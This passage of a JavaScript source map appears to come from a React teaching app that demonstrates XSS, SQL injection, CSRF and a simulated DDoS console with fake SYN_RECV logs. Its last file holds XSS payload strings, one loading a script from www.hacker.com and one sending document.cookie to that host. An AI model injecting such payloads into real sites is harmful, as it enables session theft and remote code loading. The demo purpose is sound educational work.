ip\n    }\n\n    addLogs = () => {\n        const {logs} = this.state\n        const serverConsole = `tcp    0    0    111.22.33.4:80    ${this.getRandomIp()}:${this.getRandomPort()}\\t\\tSYN_RECV`\n        const fin = serverConsole.padEnd(40)\n        this.setState({\n            logs: [ ...logs, fin]\n        })\n    }\n\n    render() {\n        const {logs, isOpen} = this.state\n        return (\n            <div>\n                <h1 style={{textAlign: 'center'}}>Server Module(DDos attack)</h1>\n                <Row gutter={16} type=\"flex\" justify=\"center\">\n                    {/*Left*/}\n                    <Col span={8}>\n                        <Divider>Frontend</Divider>\n                        <h3>Press the button to start DDos attack</h3>\n                        <Button disabled={isOpen} onClick={this.startAttack} type=\"primary\" block>\n                            Start DDos Attack\n                        </Button>\n                        <Divider/>\n                        <Button onClick={this.stopAttack} type=\"danger\" block>\n                            Stop DDos Attack\n                        </Button>\n                    </Col>\n                    {/*Right*/}\n                    <Col span={12}>\n                        <Divider>Backend: Server Console</Divider>\n                        <pre>\n                        <code className=\"server\">\n                            {readyServerCodes}\n                            {logs.map(log => `\\n${log}`)}\n                        </code>\n                    </pre>\n                    </Col>\n                </Row>\n            </div>\n        )\n    }\n}\n\nexport default DDoS\n","export const readyServerCodes = `Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.15.0-47-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nLast login: Wed May 15 21:34:11 2019 from 111.22.33.4\nalice@dev:~$ netstat -pantu | grep SYN`\n","import React, {Component} from 'react'\nimport {HashRouter as Router, Link, Route} from \"react-router-dom\"\nimport {Menu} from 'antd'\nimport './App.css'\nimport 'highlight.js/styles/atom-one-dark.css'\nimport XSS from './pages/XSS/XSS'\nimport SQLInject from \"./pages/SQLInject/SQLInject\"\nimport CSRF from \"./pages/CSRF/CSRF\"\nimport DDoS from \"./pages/DDoS/DDoS\"\n\nclass App extends Component {\n    state = {\n        current: 'xss',\n    }\n\n    onChangeMenu = (e) => {\n        this.setState({\n            current: e.key,\n        });\n    }\n\n    render() {\n        return (\n            <Router className=\"App\">\n                <Menu\n                    className=\"app-menu\"\n                    onClick={this.onChangeMenu}\n                    selectedKeys={[this.state.current]}\n                    mode=\"horizontal\">\n                    <Menu.Item key=\"xss\">\n                        <Link to=\"/\">XSS</Link>\n                    </Menu.Item>\n                    <Menu.Item key=\"sql-inject\">\n                        <Link to=\"/sql-inject\">SQL Inject</Link>\n                    </Menu.Item>\n                    <Menu.Item key=\"csrf\">\n                        <Link to=\"/csrf\">CSRF</Link>\n                    </Menu.Item>\n                    <Menu.Item key=\"ddos\">\n                        <Link to=\"/ddos\">DDoS</Link>\n                    </Menu.Item>\n                </Menu>\n                <div className=\"app-content\">\n                    <Route path=\"/\" exact component={XSS}/>\n                    <Route path=\"/sql-inject\" component={SQLInject}/>\n                    <Route path=\"/csrf\" component={CSRF}/>\n                    <Route path=\"/ddos\" component={DDoS}/>\n                </div>\n            </Router>\n        )\n    }\n}\n\nexport default App\n","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read https://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.1/8 is considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\nexport function register(config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl, config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl, config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl)\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready.then(registration => {\n      registration.unregister();\n    });\n  }\n}\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport App from './App';\nimport * as serviceWorker from './serviceWorker';\n\nReactDOM.render(<App />, document.getElementById('root'));\n\n// If you want your app to work offline and load faster, you can change\n// unregister() to register() below. Note this comes with some pitfalls.\n// Learn more about service workers: https://bit.ly/CRA-PWA\nserviceWorker.unregister();\n","export const defaultDB = [{\n    key: '1',\n    id: '1',\n    content: 'A nice movie',\n}, {\n    key: '2',\n    id: '2',\n    content: 'That movie is so fun',\n}]\n\nexport const columns = [{\n    title: 'review_id',\n    dataIndex: 'id',\n    key: 'id',\n}, {\n    title: 'review_content',\n    dataIndex: 'content',\n    key: 'content',\n}];\n","export const alertCode = `<script>alert(\"You are hack!\")</script>`\nexport const outsideCode = `<script src=\"www.hacker.com/main.js\"></script>`\nexport const stealCookie = `<script>sendHTTPRequest(\"www.hacker.com\", document.cookie)</script>`\n"],"sourceRoot":""}